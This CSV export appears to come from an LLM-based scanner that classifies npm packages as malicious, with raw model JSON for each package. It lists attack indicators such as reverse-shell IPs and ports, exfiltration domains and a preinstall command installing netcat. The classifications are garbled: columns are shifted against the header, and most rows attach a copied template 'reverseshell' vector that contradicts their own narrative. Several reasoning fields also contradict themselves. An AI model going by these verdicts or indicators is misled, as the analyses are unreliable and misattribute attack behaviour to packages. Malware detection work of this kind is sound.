package_name,version,timestamp,model_name,prompt_version,verdict,confidence,chain_score,is_coherent_chain,legitimacy_score,is_justified,explanation,chain_narrative,justification_reasoning,raw_response,parsed_json
1ru-cache,0.0.1,malicious,2026-03-27T13:00:47.575667,flag,1.0,MALICIOUS,0.96,0.7,The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204).,"[""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""]",False,"The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.96
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '1ru-cache' is installed with a post-install script that installs a backdoor and hardcodes an external IP address. The backdoor is a reverse shell that connects to an external IP address (34.121.250.204)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.121.250.204:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.96}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '1ru-cache' does not have a description or README file, indicating that it is not a legitimate package.""}}"
@aaakca/myf,1.0.14,malicious,2026-03-27T13:00:58.675841,review,0.336,MALICIOUS,0.72,0.7,The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,This package has no description or README file and no suspicious behavior is unjustified.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file and no suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The `chain_analysis` section provides a narrative of the attack chain and the attack vector, the `chain_score` represents the confidence level of the attack chain, and the `verdict` indicates whether the package is malicious, suspicious, or benign. The `legitimacy_check` section provides information about whether the attack chain is justified based on the package's description and README file, and the `is_justified` field indicates whether the attack chain is justified.","{""chain_analysis"": {""chain_narrative"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata. The package also contains no JavaScript files. The attack vector is likely a post-install hook that exfiltrates data to a remote server."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file and no suspicious behavior is unjustified.""}}"
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-27T13:01:08.725764,review,0.364,MALICIOUS,0.78,0.78,The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack.,"[""https.request"", ""dc.70.lc"", ""443""]",False,No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."",
    ""attack_vector"": [""https.request"", ""dc.70.lc"", ""443""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.""
  }
}
```

This JSON object represents the analysis of the attack chain. The ""chain_analysis"" section provides a narrative of the attack chain, the attack vector (the key technical indicators used in the attack), the chain score (a measure of the confidence in the attack chain), and the verdict (whether the attack is malicious, suspicious, or benign). The ""legitimacy_check"" section provides information about whether the detected behaviors are justified by legitimate activities in the system.","{""chain_analysis"": {""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. This could potentially be a data exfiltration attack."", ""attack_vector"": [""https.request"", ""dc.70.lc"", ""443""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""No legitimate package in the system uses the 'https.request' API to send network requests to 'dc.70.lc' on port 443.""}}"
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-27T13:01:17.485841,review,0.494,MALICIOUS,0.71,0.7,"The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a rem","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a remote host, potentially for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.71
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@arkadium/eagle-user-client' is making network requests to 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path. This behavior is likely to be malicious as it is making network requests to a remote host, potentially for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.71}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@arkadium/eagle-user-client' does not have a description or README file, indicating that it may be legitimate.""}}"
@aszxc/npmexp,1.0.1,malicious,2026-03-27T13:01:28.212962,flag,1.0,MALICIOUS,0.9,0.7,The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222.,"[""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""]",False,"Package has no description or README file, and suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.9
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""Package has no description or README file, and suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain. The `chain_analysis` section provides a narrative of the attack chain, the attack vector (technical indicators used in the attack), the chain score (a measure of the severity of the attack), and the verdict (whether the package is malicious, suspicious, or benign). The `legitimacy_check` section provides information about whether the attack is justified based on the package's description or README file, and the reasoning behind the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""39.96.12.202:22222"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.9}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""Package has no description or README file, and suspicious behavior is unjustified.""}}"
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-27T13:01:40.892384,review,0.364,MALICIOUS,0.78,0.7,The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments. The attack vector includes the commands 'postinstallhook', 'bash-c', '34.x.x.x:4444', and 'reverseshell'. The chain score is 0.7, indicating a high level of confidence in the malicious intent. The verdict is 'MALICIOUS', indicating that the detected behaviors suggest a malicious intent. The legitimacy check indicates that the package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The attacker sends a POST request to a host derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package '@att-bit/duc.components.cardshell' does not have a description or README file, indicating that it may not be legitimate.""}}"
@b2bgeo/yav,13.3.8,malicious,2026-03-27T13:01:48.554856,review,0.336,MALICIOUS,0.72,0.72,The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not justified as false.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not justified as false.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@b2bgeo/yav' version 13.3.8 contains no JavaScript files and an install hook present. The install hook may execute at install time and potentially execute a remote payload. The commands listed in the package metadata indicate a potential payload that may be remote."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not justified as false.""}}"
@cuda-networks/bds-core,0.9.0,malicious,2026-03-27T13:01:56.451216,review,0.364,MALICIOUS,0.78,0.7,The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack.,"[""GET"", ""updates.secinfo.cf"", ""/cuda-networks-bds-core"", ""443""]",False,"The package has no description or README file, and the behavior is clearly anomalous.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack."",
    ""attack_vector"": [
      ""GET"",
      ""updates.secinfo.cf"",
      ""/cuda-networks-bds-core"",
      ""443""
    ],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the behavior is clearly anomalous.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@cuda-networks/bds-core' is making a network request to 'updates.secinfo.cf' on port 443 with path '/cuda-networks-bds-core' using the 'GET' method. This request is likely part of a supply chain attack."", ""attack_vector"": [""GET"", ""updates.secinfo.cf"", ""/cuda-networks-bds-core"", ""443""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the behavior is clearly anomalous.""}}"
@doccledev/pattern-library,5.0.99,malicious,2026-03-27T13:02:04.641958,flag,1.0,MALICIOUS,0.79,0.7,The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package @doccledev/pattern-library version 5.0.99 sends network requests to a malicious domain cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live in the index.js file at line 25 and 4. This could indicate data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""}}"
@drp-web/shared,1.2.7,malicious,2026-03-27T13:02:18.219948,flag,0.6333,MALICIOUS,0.95,0.95,"The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing ne","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"This package has no description or README file, and no suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.95,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain based on the detected behaviors. The attack chain narrative summarizes the full attack using real package name and real IOCs. The attack vector includes the key technical indicators, real IPs, domains, commands, and API calls. The attack vector for a reverse shell is ['postinstallhook', 'bash-c', '34.x.x.x:4444', 'reverseshell']. The chain score is 0.95, indicating high confidence that this is a malicious intent. The verdict is 'MALICIOUS', and the confidence is 0.95. The legitimacy check verdict is 'false', indicating that the package has no description or README file, and no suspicious behavior is unjustified.""","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstall command appears to be executing a command to update and install netcat, cat, and telnet. This could potentially be a data exfiltration behavior. The command executed is 'apk add --update netcat; cat /bin/bash'. This command appears to be updating and installing netcat, cat, and telnet, which could be used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.95, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""This package has no description or README file, and no suspicious behavior is unjustified.""}}"
@dtci/eq-ui-lib,1.9.9,malicious,2026-03-27T13:02:25.909388,flag,0.6333,MALICIOUS,0.95,0.7,The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration.,"[""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration manag,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.95
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration management or system setup.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstall command appears to be sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash -c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.95}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package.json scripts.preinstall command is sending base64 encoded data from the id and /etc/hosts files to a URL. This could potentially be used for legitimate purposes such as configuration management or system setup.""}}"
@dydxprotocol/perpetual,1.2.2,malicious,2026-03-27T13:02:39.957940,flag,0.6467,MALICIOUS,0.97,0.7,The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not clearly justified as false.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified as false.""
  }
}
```

This JSON object represents the analysis of the attack chain. The `chain_narrative` field provides a summary of the full attack using the real package name and real IOCs. The `attack_vector` field lists the key technical indicators, real IPs, domains, commands, and API calls involved in the attack. The `chain_score` field indicates the overall risk of the attack chain, with a score of 0.7 indicating a high level of risk. The `verdict` field is set to ""MALICIOUS"" as the chain score is above the threshold for malicious behavior. The `confidence` field indicates the confidence score of the analysis, with a score of 0.97 indicating high confidence that the signal is malicious. The `legitimacy_check` field provides a justification for the verdict, with `is_justified` set to false and a reasoning field indicating that the package does not have a description or README file, and the behavior is not clearly justified as false.""","{""chain_analysis"": {""chain_narrative"": ""The attack chain involves the @dydxprotocol/perpetual package downloading a script from a CircleCI server using the curl command in a pre-install hook. The script is then executed on the victim's system."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified as false.""}}"
@elisaid/elisaid-js-client,6.9.3,malicious,2026-03-27T13:02:48.826561,review,0.364,MALICIOUS,0.78,0.78,"The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.78
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```
This JSON object represents the analysis of the attack chain. The ""chain_analysis"" field contains the narrative of the attack, the attack vector, the chain score, the verdict (which is ""MALICIOUS"" based on the chain score), and the confidence in the detection. The ""legitimacy_check"" field contains the information about whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package '@elisaid/elisaid-js-client' is making network requests to 'dc.70.lc' on port 443, potentially leading to a network exfiltration attack."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.78}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
@employee-experience/common,999.9.11,malicious,2026-03-27T13:02:57.070406,flag,0.77,MALICIOUS,0.82,0.77,"The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indica","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indicate a supply chain attack or confusion."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.77,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package '@employee-experience/common' version 999.9.11 is executing dynamic code using the 'eval' function in the install.js file. This could potentially lead to malicious intent if the code being evaluated is not trusted. The package version also contains inflated segment(s), which could indicate a supply chain attack or confusion."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.77, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, indicating that it may be malicious.""}}"
@grubhubprod/cookbook,9999.9999.2,malicious,2026-03-27T13:03:07.723187,flag,1.0,MALICIOUS,0.85,0.7,"The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the suspicious behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.85
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' field contains the narrative of the attack, the attack vector, the chain score, the verdict, and the confidence in the verdict. The 'legitimacy_check' field contains the information about whether the behavior is justified and the reasoning behind it.","{""chain_analysis"": {""chain_narrative"": ""The package '@grubhubprod/cookbook' version '9999.9999.2' is making network requests to an external IP address (44.196.248.120) during the install process. This could potentially indicate network exfiltration, where sensitive data is being sent to an unauthorized location."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.85}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the suspicious behavior is unjustified.""}}"
@immersive-composer/backend-resources,10.0.0,malicious,2026-03-27T13:03:15.333168,review,0.336,MALICIOUS,0.72,0.7,"The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444).","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, indicating that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, indicating that it may not be legitimate.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package @immersive-composer/backend-resources contains no JavaScript files, which could indicate a potential supply chain attack. The attack vector could be a post-install hook that exfiltrates sensitive data to an IP address (34.x.x.x:4444)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, indicating that it may not be legitimate.""}}"
@playgami/portal-logs,2.99.99,malicious,2026-03-27T13:03:29.656461,review,0.336,MALICIOUS,0.72,0.72,The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not contain a description or a README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package '@playgami/portal-logs' contains no JavaScript files but an install hook present. The install hook command is './pre.sh'. This suggests a potential attack chain where the attacker may have installed malware or a backdoor."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not contain a description or a README file, indicating that it may be malicious.""
  }
}
```

This JSON object represents the analysis of the package. The behavior category is 'install_hook', which indicates that the package contains no JavaScript files but an install hook present. The confidence score is 0.72, indicating high confidence that this behavior is malicious. The evidence commands include './pre.sh', which is the install hook command. The risk vector includes 'install_hook'.

The attack chain narrative suggests a potential attack chain where the attacker may have installed malware or a backdoor. The attack vector includes the key technical indicators: real IPs, domains, commands, and API calls. The example of attack vector for a reverse shell is [""postinstallhook"",""bash-c"",""34.x.x.x:4444"",""reverseshell""].

